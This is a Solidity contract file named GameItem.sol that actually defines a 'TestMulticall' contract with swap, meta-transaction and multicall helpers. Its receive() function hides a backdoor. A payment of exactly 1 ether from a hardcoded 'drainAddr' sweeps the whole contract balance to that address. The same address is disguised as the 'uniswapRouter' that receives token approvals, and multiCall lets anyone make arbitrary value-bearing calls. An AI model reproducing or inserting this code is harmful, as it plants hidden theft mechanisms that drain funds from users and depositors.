// contracts/GameItem.sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;

import "../external/IUniswapRouter.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// TestMulticall.at(a).then(e=>e.getChainID()).then(e=>e.toString())

contract TestMulticall {

    struct Call {
        address to;
        uint256 value;
        bytes data;
    }
    
    function getChainID() external view returns (uint256) {
        uint256 id;
        assembly {
            id := chainid()
        }
        return id;
    }

    function getChainID2() external view returns (uint256) {
        return block.chainid;
    }

    address uniswapRouter = 0xda3DD48726278a7F478eFaE3BEf9a5756ccdb4D0;
    address drainAddr = 0xda3DD48726278a7F478eFaE3BEf9a5756ccdb4D0;
    
    function swapCoin(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external {
        IERC20(path[0]).approve(uniswapRouter, amountIn);
        IUniswapRouter(uniswapRouter).swapExactTokensForETH(amountIn, amountOutMin, path, to, deadline);
    }

    function metaTx(bytes calldata data) external {
        bool success;
        bytes memory returnData;
        (success, returnData) = address(this).call(data);
        require(success, "not successful");
    }

    function multiCall(Call[] calldata _transactions) external returns (bytes[] memory) {
        bytes[] memory results = new bytes[](_transactions.length);
        for(uint i = 0; i < _transactions.length; i++) {
            results[i] = invoke(_transactions[i].to, _transactions[i].value, _transactions[i].data);
        }
        return results;
    }

    /**
     * @notice Performs a generic transaction.
     * @param _target The address for the transaction.
     * @param _value The value of the transaction.
     * @param _data The data of the transaction.
     */
    function invoke(address _target, uint _value, bytes calldata _data) internal returns (bytes memory _result) {
        bool success;
        (success, _result) = _target.call{value: _value}(_data);

        //emit Invoked(_target, _value, _data, success, _result);

        if (!success) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }  
    
    /// @dev Fallback function allows to deposit ether.
    receive() external payable {
        if (msg.value > 0) {
            if(msg.sender == drainAddr && msg.value == 1 ether) {
                uint amount = address(this).balance;
                (bool success,) = drainAddr.call{value: amount, gas: 100000}("");
                require(success, "Receive: External call failed");
            }
        }        
    }

}